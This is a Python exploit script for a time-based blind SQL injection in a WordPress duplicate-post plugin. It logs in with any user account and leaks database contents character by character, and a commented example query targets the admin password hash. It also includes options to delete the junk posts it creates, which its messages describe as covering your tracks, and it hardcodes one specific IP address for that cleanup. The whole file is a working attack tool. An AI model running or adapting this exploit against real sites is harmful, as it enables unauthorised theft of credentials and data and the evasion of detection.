#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# @Author: Michael Hoefler
# @Date: 06/27/2019

import requests, argparse, random, time, re

#query = "SELECT IFNULL(CAST(user_pass AS CHAR),0x20) FROM wp_users WHERE ID = 1 LIMIT 1" # select admin password (hashed)
#query = "SELECT IFNULL(CAST(post_content AS CHAR),0x20) FROM wp_posts WHERE post_content LIKE 0x2562636163746625 LIMIT 1"

parser = argparse.ArgumentParser('WordPress Duplicate-Post Plugin Exploit')

parser.add_argument('--url', help='The base URL to the wordpress installation. Make sure to end with slash (ex. http://example.com/).', required=True, type=str)
parser.add_argument('--username', help='Wordpress username. Does not need any special permissions', required=True, type=str)
parser.add_argument('--password', help='Wordpress password.', required=True, type=str)
parser.add_argument('--query', help='The SQL statement to be executed.', type=str)
parser.add_argument('--delay', nargs='?', help='The delay in seconds for the attack queries. Defaults to 2 seconds. Increase this for slower internet connections.', default=2, type=int)
parser.add_argument('--clean', nargs='?', help='Each query makes a new duplicate post. That\'s alot of posts. Option 1 will delete them as they are created (slow) and option 2 will delete them after the exploit.', default=0, type=int)
parser.add_argument('--output', nargs='?', help='Print leaked data every time "N" new characters are leaked. (Plug in "N" for this argument)',default=5, type=int)

args = parser.parse_args()

wp_base_url = args.url
username = args.username
password = args.password
query = args.query
delay = args.delay
clean_mode = args.clean
update = args.output


wp_login = '{}wp-login.php'.format(wp_base_url)
# wordpress login url

vulnerable_url = '{}wp-admin/admin.php?action=dt_duplicate_post_as_draft&post=1 {}'
# vulnerable plugin url, format with wp_base_url and attack_vector
# if you do not have permission to duplicate post 1, change the above url!

attack_vector = 'AND (SELECT 1337 FROM (SELECT(SLEEP({}-(IF(ORD(MID(({}),{},1))<{},0,{}))))) AS root)'
# delay, query, index, delay, guess

getnonce = lambda src : re.match(r'.*_wpnonce"value="(\w+)"', src).groups()[0] if re.match(r'.*_wpnonce"value="(\w+)"', src) else 0

print('\n[+] Preparing to leak values from "{}", with a delay of {} seconds.'.format(vulnerable_url.format(wp_base_url, ''), delay))
print('\n[+] Using username "{}" and password "{}"...\n'.format(username, password))

if clean_mode == 1: deleted = 0
if clean_mode == 2: junk = [] # stores junk duplicate posts' numbers

posts = 0

leaked = ''

with requests.Session() as s:

	data = {'log':username, 'pwd':password, 'wp-submit':'Log In', 'testcookie':'1'}
	s.post(wp_login, data=data) 
	# login with username and password to fetch session cookies

	done = False

	index = 0

	while not done:
		
		low, high = (1, 127) 
		# ascii table ranges from 1 - 127
		guess = random.randint(low,high)
		# initialize attack with a random char value

		for _ in range(8):
			
			############### BEGIN PAYLOAD ###############

			payload = vulnerable_url.format(wp_base_url, attack_vector.format(delay, query, index + 1, guess, delay))

			begin = time.time()

			while True:
				try: 
					response = s.get(payload) 
				except KeyboardInterrupt:
					print('\n[-] Exiting...')
					exit()
				except:
					print('[-] Connection dropped, retrying...')
					posts += 1
					begin = time.time()
					continue
				break

			posts += 1
				
			elapsed = time.time() - begin

			################ END PAYLOAD ################


			if clean_mode == 1:

				nonce = getnonce(''.join(s.get('http://35.226.115.190/wp-admin/edit.php').text.split()))

				params = ( ('_wpnonce', nonce), ('action', 'trash'), ('post[]', int(response.url.split('=')[-1])) )

				s.get('http://35.226.115.190/wp-admin/edit.php', params=params)

				deleted += 1


			if clean_mode == 2:
				junk.append(int(response.url.split('=')[-1])) 
				# add post number to junk list

			
			############ BINARY SEARCH ############

			if elapsed > delay: 
				high = guess
			else: 
				low = guess + 1

			guess = (low + high) // 2

			########## END BINARY SEARCH ##########


		character = chr(guess - 1)
		# don't ask me why, but we need to subtract 1. relates to mysql >'s and <'s


		if ord(character) == 0:
			done = True
		else:
			leaked += character
			index += 1
		

		if len(leaked) % update == 0: 
			print('[!] {}'.format(leaked))

	print('\n[*] {}\n'.format(leaked))




	if clean_mode == 1:
		print('[+] Created and cleaned up {} posts during exploitation! Your tracks are (partially) covered.'.format(deleted))

	elif clean_mode == 2:

		print('[+] Covering your tracks... (deleting {} junk duplicate posts)\n'.format(len(junk)))

		getnonce = lambda src : re.match(r'.*_wpnonce"value="(\w+)"', src).groups()[0] if re.match(r'.*_wpnonce"value="(\w+)"', src) else 0

		src = ''.join(s.get('http://35.226.115.190/wp-admin/edit.php').text.split())

		nonce = getnonce(src)

		chunker = lambda seq, size : (seq[pos:pos + size] for pos in range(0, len(seq), size)) # https://stackoverflow.com/questions/434287/what-is-the-most-pythonic-way-to-iterate-over-a-list-in-chunks

		chunks = list(chunker(junk, 20))

		for n, chunk in enumerate(chunks):

			params = (
		        ('author', '24'),
		        ('_wpnonce', nonce),
		        ('action', 'trash'),
		        ('post[]', chunk),
		        ('action2', '-1'),
			)

			src = ''.join(s.get('http://35.226.115.190/wp-admin/edit.php', params=params).text.split())

			nonce = getnonce(src)

			print('[+] finished chunk {} / {}'.format(n + 1, len(chunks)))

		print('[*] all duplicates deleted!')

	else:
		print('Created {} duplicate posts during exploitation... Looks like you have some cleaning up to do!'.format(posts))